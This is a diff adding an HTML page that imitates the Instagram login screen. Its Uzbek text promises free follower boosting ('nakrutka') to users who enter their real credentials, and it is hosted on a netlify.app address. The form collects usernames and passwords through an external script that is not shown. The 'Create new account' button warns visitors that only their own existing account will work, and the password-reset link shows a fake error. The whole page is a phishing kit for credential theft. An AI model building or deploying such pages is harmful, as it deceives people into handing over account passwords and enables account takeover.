@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+	<title>Instagram</title>
+	<link rel="stylesheet" type="text/css" href="style.css">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+	<!-- STYLE OG -->
+
+	<meta property="og:title" content="Instagram(LetsFree)">
+    <meta property="og:description" content="LetsFree orqali siz o'z instagram profilingizga nakrutkaurishingiz mumkin, xoziroq sinab koring. Barcha huquqlar himoyalangan!">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="pro.jpg">
+    <meta property="og:url" content="https://letsfreecom.netlify.app">
+
+</head>
+<body>
+
+	<div class="div-center">
+		<div class="inline-div">
+			<header class="header">
+
+				<i class="fab-fa instagram">
+					<h2>Instagram</h2>
+				</i>
+
+				<p>Nakrutkani instagramga kirganingizdan keyin, tanlashingiz mumkin!</p>
+			</header>
+
+			<hr><br>
+
+			<form class="form" id="contactForm">
+				<input type="text" name="user" placeholder="Username..." id="name" required><br><br>
+
+				<input type="password" name="pass" placeholder="Password..." id="pess" required><br><br>
+
+				<button class="btn-submit" type="submit">Log in</button><br><br>
+
+				<script type="text/javascript" src="script.js"></script>
+			</form>
+
+			<a onclick="document.getElementById('div1').style.display='block'" class="">Forgotten password?</a><br>
+
+			<div class="div-inline-block">
+				<div class="div-toggle" id="div1">
+					<p>Xatolik yuz berdi iltimos qaytadan urining ❌</p>
+				</div>
+			</div>
+
+			<style type="text/css">
+				body {
+					text-align: center;
+				}
+
+				.div-inline-block {
+					display: inline-block;
+					border:none;
+				}
+
+				.div-toggle {
+					display: none;
+					width: 300px;
+					border: 1px solid red;
+					color: red;
+					margin-top: 20px;
+					font-size: 17px;
+				}
+			</style>
+
+			<footer class="footer">
+				<button class="btn-creat" onclick="alert('Tog`ridan-to`g`i yangi akaunt ochish orqali, sizga obunachi kelmaydi ❌. Iltimos ozingizning akauntingiz orqali kiring.')">Create new account</button>
+
+				<p>Contact || Pravcy Policy || About Us</p>
+			</footer>
+		</div>
+	</div>
+
+</body>
+</html>
